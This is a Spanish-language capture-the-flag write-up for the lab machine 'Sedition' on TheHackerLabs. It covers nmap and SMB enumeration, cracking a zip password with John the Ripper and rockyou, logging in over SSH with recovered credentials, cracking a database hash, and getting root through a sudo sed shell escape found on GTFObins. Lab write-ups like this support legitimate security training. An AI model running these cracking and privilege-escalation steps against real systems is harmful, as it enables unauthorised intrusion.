# Sedition (TheHackerLabs)
---
## ⚙️ Herramientas utilizadas
## Reconocimiento
### Arp-scan
```bash sudo arp-scan -I eth0 --localnet ```
```text 192.168.1.108   08:00:27:60:6a:ed       (Unknown) ```
- Resultado -> la ip víctima es 192.168.1.108
### Ping
```bash ping -c 1 192.168.1.108
```text PING 192.168.1.108 (192.168.1.108) 56(84) bytes of data.
64 bytes from 192.168.1.108: icmp_seq=1 ttl=64 time=1.63 ms
- Resultado -> ttl=64, por lo que es una máquina linux.
### Nmap
Lanzamos un nmap completo para comprobar los puertos abiertos:
nmap -p- -sS -sC -sV --open --min-rate=5000 -n -vvv -Pn 192.168.1.108 -oN escaneo.txt
Resultado -> puerrtos abiertos 139 y 445 (SMB) y 65535:
Nmap scan report for 192.168.1.108
Host is up, received arp-response (0.00024s latency).
Scanned at 2025-07-14 17:08:52 CEST for 13s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE     REASON         VERSION
139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 4
445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 4
65535/tcp open  ssh         syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 32:ca:e5:d1:12:c2:1e:11:1e:58:43:32:a0:dc:03:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG/Kzfk09iAKKpRuJrSfx4A4WiSlvP++mk2g5NcP7Bfva4A0l0SZxeDNKXB6iJN1++qyQWE2OUVzLrZ8Gdjkn+M=
|   256 79:3a:80:50:61:d9:96:34:e2:db:d6:1e:65:f0:a9:14 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILvZ909p40dk+Vi+xYHAfVXI4wI0XGPS/fgHXpFI2mRP
MAC Address: 08:00:27:60:6A:ED (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s
| smb2-time: 
|   date: 2025-07-14T15:09:04
|_  start_date: N/A
| nbstat: NetBIOS name: SEDITION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SEDITION<00>         Flags: <unique><active>
|   SEDITION<03>         Flags: <unique><active>
|   SEDITION<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 58844/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 27853/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 57010/udp): CLEAN (Failed to receive data)
|   Check 4 (port 56717/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
### 🚨 ¿Puerto 65535 abierto?
Esto no es común. El puerto 65535 (el más alto del rango TCP) suele estar cerrado. Si está abierto y no se identifica el servicio (unknown), es muy probable que sea:
- Un servicio personalizado o camuflado (por ejemplo, un SSH oculto)
### SMBClient
smbclient -L 192.168.1.108 -N
Resultado:
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
backup          Disk      
IPC$            IPC       IPC Service (Samba Server)
nobody          Disk      Home Directories
Probar acceso sin contraseña a los recursos interesantes:
smbclient //192.168.1.108/nobody -N
Resultado:
smbclient //192.168.1.108/nobody -N

tree connect failed: NT_STATUS_ACCESS_DENIED
Ahrora probamos con backup:
smbclient //192.168.1.108/backup -N
smb: \> ls
  secretito.zip                       N      216  Sun Jul  6 19:02:31 2025
Descargamos secretito.zip:
get secretito.zip
Descomprimimos la carpeta secretito.zip pero nos pide contraseña:
unzip secretito.zip
Archive:  secretito.zip
[secretito.zip] password password:
JohnTheRipper
Crackeamos la contraseña con JohnTheRipper.
Sacamos el hash:
zip2john secretito.zip > hash
$ cat hash       
secretito.zip/password:$pkzip$1*2*2*0*22*16*f2e5967a*0*42*0*22*969d*ee16b094213a1612e10c6608d4c2a170383b6b429176dfb6baac253a70a84e202ae7*$/pkzip$:password:secretito.zip::secretito.zip
Le pasamos el rockyou.txt para buscar la contraseña del hash:
john --wordlist=/usr/share/wordlists/rockyou.txt hash

Descomprimimos secretito.zip:

Leemos password:
$ cat password 
elbunkermolagollon123
Tenemos una contraseña.
RPCClient
Buscamos usuarios:
rpcclient -U "" -N 192.168.1.108
querydispinfo

Encontramos el usuario cowboy
Puerto 65535 (SSH)
Ahora que tenemos un user y una password probamos a conectarnos al puerto 65535 (ssh):
ssh cowboy@192.168.1.108 -p 65535


Escalada de privilegios
Una vez dentro intentamos conseguir usuario root.

Leemos .bash_history:

Hay una BD, nos conectamos:
mariadb -u cowboy -pelbunkermolagollon123

Está hasheada la contraseña, la crackeamos:
debian:7c6a180b36896a0a8c02787eeafb0e4c 
Estamos en CrackStation:

Nos conectamos al usuario debian:

Comprobamos si podemos ejecutar algún comando como root:
sudo -l

Buscamos en GTFObins:

Lanzamos:
sudo sed -n '1e exec sh 1>&0' /etc/hosts


Flags
Flag usuario:
/home/debian/flag.txt
Flag root:
/root/root.txt